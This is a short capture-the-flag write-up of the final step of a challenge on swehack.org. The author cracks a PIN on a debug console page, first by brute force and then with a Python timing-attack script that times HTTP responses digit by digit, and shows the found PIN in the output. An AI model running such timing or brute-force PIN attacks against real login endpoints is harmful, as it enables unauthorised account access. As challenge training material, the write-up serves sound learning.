This was the last step of a challenge that grocid published @ swehack.org

https://oppnakarnan.cf/debugterminal3/console_346j7.php?username=core&pin=

So it was obvious we needed the correct pin and grocid left a hint 'take the time to get to the next step'.

I actually wrote a brute force script starting from 1000, i guessed the pin was four digits and started the script, went to work and when I got home the script had found the correct pin.

However, this was not the "correct" way, I could use a timing attack instead and crack the pin in a couple of minutes, and this is good training for me :)

```
import requests
import time


def brutepin(pin):
        payload = {"username": "core", "pin" : pin}
        start = time.time()
        r = requests.get('https://oppnakarnan.cf/debugterminal3/console_346j7.php', params=payload)
        r.content  
        roundtrip = time.time() - start 
        resp.append(roundtrip)

def testpin(pin):
        r = requests.get('https://oppnakarnan.cf/debugterminal3/console_346j7.php?username=core&pin='+pin)      
        if not "Incorrect password" in r.text:
                print "[+] correct pin",pin
                return True

pin = p =""
found = False
for y in range(8):
        resp = []
        for n in range(10):
                p = pin
                p += str(n)
                brutepin(p)
        p = min(resp)
        p = resp.index(p)        
        pin += str(p)
        if testpin(pin) == True:
                break
```                
credz to grocid for an awesome challenge
grocid.net

Output:
```
root@lola:~/Desktop/grocid# python brute.py 
[+] correct pin 7771
```
